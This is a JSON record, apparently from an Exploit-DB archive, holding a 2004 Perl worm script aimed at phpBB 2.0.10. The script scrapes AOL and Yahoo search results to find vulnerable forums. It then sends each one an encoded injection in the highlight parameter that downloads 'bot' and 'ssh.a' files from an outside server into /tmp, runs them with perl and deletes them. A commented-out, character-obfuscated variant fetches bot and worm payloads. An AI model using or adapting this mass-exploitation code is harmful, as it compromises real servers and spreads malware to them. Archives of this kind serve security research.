{
  "id": "720",
  "title": "Sanity.b - phpBB 2.0.10 Bot Install (AOL/Yahoo Search)",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#/usr/bin/perl\r\n\r\nuse IO::Socket;\r\nuse LWP::Simple;\r\n@vul = \"\";\r\n$a=0;\r\n$numero = int rand(999);\r\n$site = \"search.aol.com\";\r\n$procura = \"viewtopic.php%3Ft%3D$numero\";\r\n\r\n######################################\r\nfor($n=0;$n<90;$n += 10){\r\n$sock = IO::Socket::INET->new(PeerAddr=>\"$site\",PeerPort=>\"80\",Proto=>\"tcp\") or next;\r\nprint $sock \"GET /aolcom/search?q=$procura&Stage=0&page=$n HTTP/1.0\\n\\n\";\r\n@resu = <$sock>;\r\nclose($sock);\r\n$ae = \"@resu\";\r\nwhile ($ae=~ m/<a href=.*?>.*?<\\/a>/){\r\n$ae=~ s/<a href=(.*?)>.*?<\\/a>/$1/;\r\n$uber=$1;\r\nif ($uber !~/translate/)\r\n{if ($uber !~ /cache/)\r\n{if ($uber !~ /\"/)\r\n{if ($uber !~ /google/)\r\n{if ($uber !~ /216/)\r\n{if ($uber =~/http/)\r\n{if ($uber !~ /start=/)\r\n{\r\nif ($uber =~/&/)\r\n{\r\n$nu = index $uber, '&';\r\n$uber = substr($uber,0,$nu);\r\n}\r\n$vul[$a] = $uber;\r\n$a++;\r\n}}}}}}}}}\r\n##########################\r\nfor($cadenu=1;$cadenu <= 99; $cadenu +=10){\r\n\r\n@cade = get(\"http://cade.search.yahoo.com/search?p=$procura&ei=UTF-8&fl=0&all=1&pstart=\r\n1&b=$cadenu\") or next;\r\n$ae = \"@cade\";\r\n\r\nwhile ($ae=~ m/<em class=yschurl>.*?<\\/em>/){\r\n$ae=~ s/<em class=yschurl>(.*?)<\\/em>/$1/;\r\n$uber=$1;\r\n\r\n$uber =~ s/ //g;\r\n$uber =~ s/<b>//g;\r\n$uber =~ s/<\\/b>//g;\r\n$uber =~ s/<wbr>//g;\r\n\r\nif ($uber =~/&/)\r\n{\r\n$nu = index $uber, '&';\r\n$uber = substr($uber,0,$nu);\r\n}\r\n$vul[$a] = $uber;\r\n$a++\r\n}}\r\n\r\n#########################\r\n\r\n\r\n#$cmd = '&highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)\r\n%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(119)%252echr(103)%2\r\n52echr(101)%252echr(116)%252echr(32)%252echr(119)%252echr(119)%252echr(119)%252e\r\nchr(46)%252echr(116)%252echr(101)%252echr(110)%252echr(104)%252echr(97)%252echr\r\n(115)%252echr(101)%252echr(117)%252echr(115)%252echr(105)%252echr(116)%252echr\r\n(101)%252echr(46)%252echr(99)%252echr(111)%252echr(109)%252echr(47)%252echr(98)%\r\n252echr(111)%252echr(116)%252echr(46)%252echr(116)%252echr(120)%252echr(116)%252\r\nechr(59)%252echr(112)%252echr(101)%252echr(114)%252echr(108)%252echr(32)%252echr\r\n(98)%252echr(111)%252echr(116)%252echr(46)%252echr(116)%252echr(120)%252echr(116)\r\n%252echr(59)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252\r\nechr(119)%252echr(119)%252echr(119)%252echr(46)%252echr(116)%252echr(101)%252echr\r\n(110)%252echr(104)%252echr(97)%252echr(115)%252echr(101)%252echr(117)%252echr(115)\r\n%252echr(105)%252echr(116)%252echr(101)%252echr(46)%252echr'.'(99)%252echr(111)%25\r\n2echr(109)%252echr(47)%252echr(119)%252echr(111)%252echr(114)%252echr(109)%252echr\r\n(46)%252echr(116)%252echr(120)%252echr(116)%252echr(59)%252echr(112)%252echr(101)\r\n%252echr(114)%252echr(108)%252echr(32)%252echr(119)%252echr(111)%252echr(114)%25\r\n2echr(109)%252echr(46)%252echr(116)%252echr(120)%252echr(116))%252e%2527';\r\n\r\n$cmd = '&rush=%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B%20cd /tmp;wget \r\nserver.org/pdf/bot;perl bot;wget server.org/pdf/ssh.a;perl ssh.a;rm -rf ssh.*;rm -rf bot*%3B%\r\n20%65%63%68%6F%20%5F%45%4E%44%5F&highlight=%2527.%70%61%73%73%74%68%72\r\n%75%28%24%48%54%54%50%5F%47%45%54%5F%56%41%52%53%5B%72%75%73%68%5\r\nD%29.%2527';\r\n\r\n$b = scalar(@vul);\r\n\r\nfor($a=0;$a<=$b;$a++)\r\n{\r\n\r\n$sitevul = $vul[$a].$cmd;\r\nif($sitevul !~/http/){ $sitevul = 'http://'.$sitevul; }\r\n$res = get($sitevul) or next;\r\n}\r\n\r\n# milw0rm.com [2004-12-25]",
  "url": "https://www.exploit-db.com/exploits/720"
}